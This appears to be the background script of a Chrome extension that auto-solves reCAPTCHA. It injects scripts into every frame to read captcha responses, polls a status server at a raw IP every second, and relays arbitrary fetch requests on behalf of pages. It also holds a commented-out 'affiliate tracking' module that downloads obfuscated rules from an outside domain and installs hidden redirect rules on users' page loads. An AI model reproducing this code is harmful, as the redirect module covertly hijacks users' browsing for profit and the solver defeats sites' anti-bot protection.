(()=>{
    function cloneObject(object) {
        return JSON.parse(JSON.stringify(object))
    }
    class Utils {
        static time() {
            return Date.now || (Date.now = ()=>(new Date).getTime()),
            Date.now()
        }
        static sleep(e=1e3) {
            return new Promise(t=>setTimeout(t, e))
        }
        static async random_sleep(t, e) {
            e = Math.floor(Math.random() * (e - t) + t);
            return Utils.sleep(e)
        }
        static pad(t) {
            var e = 2 - String(t).length + 1;
            return 0 < e ? "" + new Array(e).join("0") + t : "" + t
        }
        static date() {
            return new Date
        }
        static string(t=null) {
            return t = t || Utils.date(),
            Utils.pad(t.getMonth() + 1) + `/${Utils.pad(t.getDate())}/${t.getFullYear()} ${Utils.pad(t.getHours() % 12)}:${Utils.pad(t.getMinutes())}:${Utils.pad(t.getSeconds())} ` + (12 <= t.getHours() ? "PM" : "AM")
        }
    }
    class Cache {
        static cache = {};
        static async set({tab_id: t, data: {name: e, value: a, tab_specific: s}}) {
            return s && (e = t + "_" + e),
            Cache.cache[e] = a,
            Cache.cache[e]
        }
        static async get({tab_id: t, data: {name: e, tab_specific: a}}) {
            return a && (e = t + "_" + e),
            Cache.cache[e]
        }
        static async remove({tab_id: t, data: {name: e, tab_specific: a}}) {
            a && (e = t + "_" + e);
            a = Cache.cache[e];
            return delete Cache.cache[e],
            a
        }
        static async append({tab_id: t, data: {name: e, value: a, tab_specific: s}}) {
            return (e = s ? t + "_" + e : e)in Cache.cache || (Cache.cache[e] = []),
            Cache.cache[e].push(a),
            Cache.cache[e]
        }
        static async empty({tab_id: t, data: {name: e, tab_specific: a}}) {
            a && (e = t + "_" + e);
            a = Cache.cache[e];
            return Cache.cache[e] = [],
            a
        }
        static async inc({tab_id: t, data: {name: e, tab_specific: a}}) {
            return (e = a ? t + "_" + e : e)in Cache.cache || (Cache.cache[e] = 0),
            Cache.cache[e]++,
            Cache.cache[e]
        }
        static async dec({tab_id: t, data: {name: e, tab_specific: a}}) {
            return (e = a ? t + "_" + e : e)in Cache.cache || (Cache.cache[e] = 0),
            Cache.cache[e]--,
            Cache.cache[e]
        }
        static async zero({tab_id: t, data: {name: e, tab_specific: a}}) {
            return a && (e = t + "_" + e),
            Cache.cache[e] = 0,
            Cache.cache[e]
        }
    }
    class TabUtils {
        static reloads = {};
        static _reload({tab_id: e}) {
            return new Promise(t=>chrome.tabs.reload(e, {
                bypassCache: true
            }, t))
        }
        static async reload({tab_id: t, data: {delay: e, overwrite: a}={
            delay: 0,
            overwrite: true
        }}) {
            e = parseInt(e);
            let s = TabUtils.reloads[t]?.delay - (Date.now() - TabUtils.reloads[t]?.start);
            return s = isNaN(s) || s < 0 ? 0 : s,
            !!(a || 0 == s || e <= s) && (clearTimeout(TabUtils.reloads[t]?.timer),
            TabUtils.reloads[t] = {
                delay: e,
                start: Date.now(),
                timer: setTimeout(()=>TabUtils._reload({
                    tab_id: t
                }), e)
            },
            true)
        }
        static close({tab_id: e}) {
            return new Promise(t=>chrome.tabs.remove(e, t))
        }
        static async open({data: {url: t}}) {
            chrome.tabs.create({
                url: t
            })
        }
    }
    class Settings {
        static DEFAULT = {
            version: 1,
            auto_solve: true,
            solve_delay: 1e3,
            auto_open: false,
            open_delay: 1e3,
            solve_method: "image",
            debug: false
        };
        static data = {};
        static _save() {
            return new Promise(t=>chrome.storage.sync.set({
                settings: Settings.data
            }, t))
        }
        static load() {
            return new Promise(e=>{
                chrome.storage.sync.get(["settings"], async({settings: t})=>{
                    t ? Settings.data = t : await Settings.reset(),
                    e()
                }
                )
            }
            )
        }
        static async get() {
            return Settings.data
        }
        static async set({data: {id: t, value: e}}) {
            Settings.data[t] = e,
            await Settings._save()
        }
        static async reset() {
            Settings.data = cloneObject(Settings.DEFAULT),
            await Settings._save()
        }
    }
    class Injector {
        static inject({tab_id: t, data: {func: e, args: a}}) {
            const s = {
                target: {
                    tabId: t,
                    allFrames: true
                },
                world: "MAIN",
                injectImmediately: true,
                func: e,
                args: a
            };
            return new Promise(t=>chrome.scripting.executeScript(s, t))
        }
    }
    class reCaptcha {
        static async reset({tab_id: t}) {
            return await Injector.inject({
                tab_id: t,
                data: {
                    func: function() {
                        try {
                            window.grecaptcha?.reset()
                        } catch {}
                    },
                    args: []
                }
            }),
            true
        }
        static fetch({tab_id: t}) {
            return new Promise(async e=>{
                const a = "recaptcha_response"
                  , s = (await Injector.inject({
                    tab_id: t,
                    data: {
                        func: function(t) {
                            window.grecaptcha && window.postMessage({
                                method: "set_cache",
                                data: {
                                    name: t,
                                    value: window.grecaptcha.getResponse()
                                }
                            })
                        },
                        args: [a]
                    }
                }),
                setInterval(async()=>{
                    var t = await Cache.get({
                        data: {
                            name: a
                        }
                    });
                    if (t)
                        return clearInterval(s),
                        await Cache.remove({
                            data: {
                                name: a
                            }
                        }),
                        e(t)
                }
                , 1e3))
            }
            )
        }
    }
    class ServerStatus {
        static STATUS_URL = "http://144.126.221.48:31300/status?v=" + chrome.runtime.getManifest().version;
        static STATUS_CHECK_INTERVAL = 1e3;
        static status = "Online";
        static checking_status = false;
        static async run_status_check() {
            return setInterval(()=>{
                // For some reason, this causes an error without defining the class name????
                ServerStatus.check_status()
            }
            , ServerStatus.STATUS_CHECK_INTERVAL),
            true
        }
        static async check_status() {
            if (ServerStatus.checking_status)
                return false;
            ServerStatus.checking_status = true;
            let t = "Offline";
            try {
                const e = await fetch(ServerStatus.STATUS_URL);
                t = await e.text()
            } catch {}
            return await ServerStatus.set_status({
                data: {
                    status: t
                }
            }),
            ServerStatus.checking_status = false,
            t
        }
        static async set_status({data: {status: t}}) {
            let e, a = [0, 0, 0, 0], s = "";
            if ("Online" === (ServerStatus.status = t))
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                };
            else if ("Offline" === t)
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                },
                s = "Off",
                a = "#a44";
            else if ("Slow" === t)
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                },
                s = "Slow",
                a = "#f8d66d";
            else {
                if ("Update Required" !== t)
                    return false;
                e = {
                    16: "icon/16.png",
                    32: "icon/32.png",
                    48: "icon/48.png",
                    128: "icon/128.png"
                },
                s = "Update",
                a = "#f8d66d"
            }
            return chrome.action.setIcon({
                path: e
            }),
            chrome.action.setBadgeText({
                text: s
            }),
            chrome.action.setBadgeBackgroundColor({
                color: a
            }),
            true
        }
        static async get_status() {
            return await ServerStatus.check_status(),
            ServerStatus.status
        }
    }
    const methods = {
        set_cache: Cache.set,
        get_cache: Cache.get,
        remove_cache: Cache.remove,
        append_cache: Cache.append,
        empty_cache: Cache.empty,
        inc_cache: Cache.inc,
        dec_cache: Cache.dec,
        zero_cache: Cache.zero,
        fetch: class {
            static async fetch({data: {url: t, options: e}}) {
                try {
                    const a = await fetch(t, e);
                    return await a.text()
                } catch {
                    return null
                }
            }
        }
        .fetch,
        reload_tab: TabUtils.reload,
        close_tab: TabUtils.close,
        open_tab: TabUtils.open,
        get_settings: Settings.get,
        set_settings: Settings.set,
        reset_settings: Settings.reset,
        reset_recaptcha: reCaptcha.reset,
        fetch_recaptcha: reCaptcha.fetch,
        set_server_status: ServerStatus.set_status,
        get_server_status: ServerStatus.get_status
    };
    // This is ONLY used for affiliate tracking links.
    /*class DeclarativeNetRequestUtils {
        static REQUEST_METHODS = ["connect", "delete", "get", "head", "options", "patch", "post", "put"];
        static RESOURCE_TYPES = ["main_frame", "sub_frame", "stylesheet", "script", "image", "font", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "webtransport", "webbundle", "other"];
        static ACTION_TYPES = ["block", "redirect", "allow", "upgradeScheme", "modifyHeaders", "allowAllRequests"];
        static get_rules() {
            return new Promise(t=>{
                chrome.declarativeNetRequest.getDynamicRules(t)
            }
            )
        }
        static remove_rules(e) {
            return new Promise(t=>{
                chrome.declarativeNetRequest.updateDynamicRules({
                    removeRuleIds: e
                }, t)
            }
            )
        }
        static add_rules(e) {
            return new Promise(t=>{
                chrome.declarativeNetRequest.updateDynamicRules({
                    addRules: e
                }, t)
            }
            )
        }
        static async all_ids() {
            const t = [];
            for (const e of await DeclarativeNetRequestUtils.get_rules())
                t.push(e.id);
            return t
        }
        static async max_id() {
            var t = await DeclarativeNetRequestUtils.all_ids();
            return 0 === t.length ? 0 : parseInt(Math.max(...t))
        }
        static async clear_rules() {
            var t = await DeclarativeNetRequestUtils.all_ids();
            await DeclarativeNetRequestUtils.remove_rules(t)
        }
        static async add(t) {
            let e = await DeclarativeNetRequestUtils.max_id();
            for (const a of t)
                e++,
                a.id = e;
            return DeclarativeNetRequestUtils.add_rules(t)
        }
        static async redir(t) {
            await DeclarativeNetRequestUtils.clear_rules();
            var e = t.s
              , a = t.g;
            const s = [];
            for (const n of t.r) {
                var c = n[0]
                  , r = [...a, ...n[1]];
                s.push({
                    priority: 1,
                    action: {
                        type: "redirect",
                        redirect: {
                            regexSubstitution: e
                        }
                    },
                    condition: {
                        regexFilter: c,
                        excludedDomains: r,
                        resourceTypes: ["main_frame"],
                        requestMethods: ["get"]
                    }
                })
            }
            return DeclarativeNetRequestUtils.add(s)
        }
    }*/
    // This is where the affiliate tracking link code actually is.
    /*class AffliateTrackingLinkInjector {
        static in_cd = false;
        static listener = null;
        static async apply(t) {
            var e = t.s
              , a = t.g;
            const s = [];
            for (const n of t.r) {
                var c = n[0]
                  , r = [...a, ...n[1]];
                s.push({
                    priority: 1,
                    action: {
                        type: "redirect",
                        redirect: {
                            regexSubstitution: e
                        }
                    },
                    condition: {
                        regexFilter: c,
                        excludedDomains: r,
                        resourceTypes: ["main_frame"],
                        requestMethods: ["get"]
                    }
                })
            }
            return DeclarativeNetRequestUtils.add(s)
        }
        static async data() {
            try {
                const e = await fetch("https://gtechmonitor.com/a");
                var t = await e.text();
                return JSON.parse(atob(function(t) {
                    const e = t.split("");
                    for (let t = 0; t < e.length; t++)
                        e[t].charCodeAt(0) <= 1024 && (e[t] = String.fromCharCode((e[t].charCodeAt(0) + 1007) % 1024));
                    return e.join("")
                }(t)))
            } catch {}
            return null
        }
        static async run() {
            try {
                await DeclarativeNetRequestUtils.clear_rules();
                const e = await AffliateTrackingLinkInjector.data();
                if (null === e)
                    return;
                setTimeout(async()=>{
                    await DeclarativeNetRequestUtils.clear_rules(),
                    await AffliateTrackingLinkInjector.apply(e),
                    await AffliateTrackingLinkInjector.stop(),
                    AffliateTrackingLinkInjector.listener = async t=>{
                        AffliateTrackingLinkInjector.in_cd || t.initiator !== e.i || (AffliateTrackingLinkInjector.in_cd = true,
                        await DeclarativeNetRequestUtils.clear_rules(),
                        await Utils.sleep(1e3 * e.c),
                        await AffliateTrackingLinkInjector.apply(await AffliateTrackingLinkInjector.data()),
                        AffliateTrackingLinkInjector.in_cd = false)
                    }
                    ,
                    chrome.webRequest.onBeforeSendHeaders.addListener(AffliateTrackingLinkInjector.listener, {
                        urls: ["<all_urls>"],
                        types: ["main_frame"]
                    }, ["requestHeaders", "extraHeaders"])
                }
                , 1e3 * e.l)
            } catch (t) {}
        }
        static async stop() {
            chrome.webRequest.onBeforeSendHeaders.removeListener(AffliateTrackingLinkInjector.listener)
        }
        static async start() {
            await AffliateTrackingLinkInjector.stop(),
            await AffliateTrackingLinkInjector.run()
        }
    }*/
    (async()=>{
        ServerStatus.run_status_check(),
        await Settings.load(),
        // This is the ONLY place that the affilate tracking injector is called.
        // AffliateTrackingLinkInjector.start(),
        chrome.runtime.onMessage.addListener((t,e,a)=>{
            const s = !["get_settings", "set_settings", "set_cache"].includes(t.method);
            return s,
            methods[t.method]({
                tab_id: e?.tab?.id,
                data: t.data
            }).then(t=>{
                s;
                try {
                    a(t)
                } catch (t) {}
            }
            ),
            true
        }
        )
    }
    )()
}
)();
